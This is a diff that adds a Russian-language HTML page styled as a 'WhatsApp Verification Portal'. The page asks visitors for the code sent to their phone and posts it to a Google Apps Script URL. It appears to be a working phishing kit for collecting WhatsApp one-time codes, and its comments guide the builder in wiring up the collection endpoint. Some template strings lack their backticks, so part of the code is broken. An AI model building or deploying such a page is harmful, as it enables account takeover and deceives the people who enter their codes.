@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Verification Portal</title>
+    <style>
+        /* --- Базовый Сброс и Фон --- */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #ECE5DD; /* Классический фон WhatsApp */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        /* --- Контейнер (Сама карточка входа) --- */
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border-top: 8px solid #25D366; /* Зеленая полоса сверху */
+        }
+        /* --- Заголовок и Логотип --- */
+        .header-area {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            margin-right: 15px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/0/0e/WhatsApp_logo.svg');
+            background-size: cover;
+            background-position: center;
+        }
+        h1 {
+            font-size: 26px;
+            color: #075E54; /* Глубокий WhatsApp Green */
+            margin: 0;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        /* --- Форма и Поля --- */
+        .input-field {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-field label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 15px;
+        }
+        .input-field input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .input-field input[type="text"]:focus {
+            border-color: #25D366;
+            outline: none;
+        }
+        /* --- Кнопка --- */
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #25D366; 
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.1s;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        button:hover:not(:disabled) {
+            background-color: #1da851;
+        }
+        button:active:not(:disabled) {
+            transform: scale(0.99);
+        }
+        button:disabled {
+            background-color: #A9D9B3;
+            cursor: not-allowed;
+        }
+        /* --- Сообщения (Feedback) --- */
+        #message {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 6px;
+            font-weight: 600;
+            text-align: center;
+            display: none; 
+            border: 1px solid;
+        }
+        .success {
+            background-color: #e8f5e9;
+            color: #388e3c; /* Зеленый */
+            border-color: #4caf50;
+        }
+        .error {
+            background-color: #ffebee;
+            color: #d32f2f; /* Красный */
+            border-color: #f44336;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header-area">
+            <div class="logo"></div>
+            <div>
+                <h1>WhatsApp Verification</h1>
+                <p class="subtitle">Введите код, который был отправлен на ваш номер, чтобы продолжить авторизацию.</p>
+              <form id="whatsappForm">
+            <div class="input-field">
+                <label for="code_whatsapp">Код Подтверждения:</label>
+                <input type="text" id="code_whatsapp" name="code_whatsapp" required autocomplete="one-time-code">
+            </div>
+            <button type="submit" id="submitBtn">Подтвердить и Войти</button>
+        </form>
+
+        <div id="message"></div>
+    </div>
+
+    <script>
+        document.getElementById('whatsappForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const form = event.target;
+            const codeInput = document.getElementById('code_whatsapp');
+            const messageDiv = document.getElementById('message');
+            const submitButton = document.getElementById('submitBtn');
+
+            const code = codeInput.value.trim();
+
+            // =====================================================================
+            // !!! КРИТИЧЕСКИЙ ШАГ: ВСТАВЬ СЮДА URL ОТ GOOGLE APPS SCRIPT !!!
+            const GAS_ENDPOINT_URL = "https://script.google.com/macros/s/AKfycbz4qH81fKDXsVaD3HHTI6muqhkYkzFPEskJAmfHNgjUu9TWGFuFm1IoXAY7Z6DFrqtEDw/exec"; 
+            // =====================================================================
+
+            messageDiv.style.display = 'none';
+            submitButton.textContent = 'Проверка...';
+            submitButton.disabled = true;
+
+            try {
+                // Отправка данных через POST
+                const response = await fetch(GAS_ENDPOINT_URL, {
+                    method: 'POST',
+                    headers: {
+                        // Указываем, что мы отправляем данные в формате формы
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    // Формируем тело запроса: имя_поля=значение
+                    body: new URLSearchParams({
+                        'code_whatsapp': code
+                    })
+                });
+
+                // Пытаемся получить ответ в формате JSON от скрипта
+                if (!response.ok) {
+                    // Если HTTP статус 4xx или 5xx
+                    throw new Error(HTTP Error! Status: ${response.status} ${response.statusText});
+                }
+
+                const result = await response.json();
+
+                // Проверка логики, которую ты заложил в Google Apps Script
+                if (result && result.result === 'success') {
+                    messageDiv.textContent = '✅ Код успешно подтвержден. Вы авторизованы!';
+                    messageDiv.className = 'success';
+                } else {
+                    // Это срабатывает, если GAS отдал ответ, но result.result не 'success'
+                    const errorMessage = result.message || 'Не удалось подтвердить код. Проверьте введенные данные.';
+                    messageDiv.textContent = ❌ Ошибка подтверждения: ${errorMessage};
+                    messageDiv.className = 'error';
+                }
+            } catch (error) {
+                console.error('Fetch/Network Error:', error);
+                messageDiv.textContent = 🚨 Сбой подключения к серверу. Проверьте, что URL GAS_ENDPOINT_URL верен и скрипт запущен.;
+                messageDiv.className = 'error';
+            } finally {
+                // Восстановление состояния
+                submitButton.textContent = 'Подтвердить и Войти';
+                submitButton.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
+            </div>
+        </div>
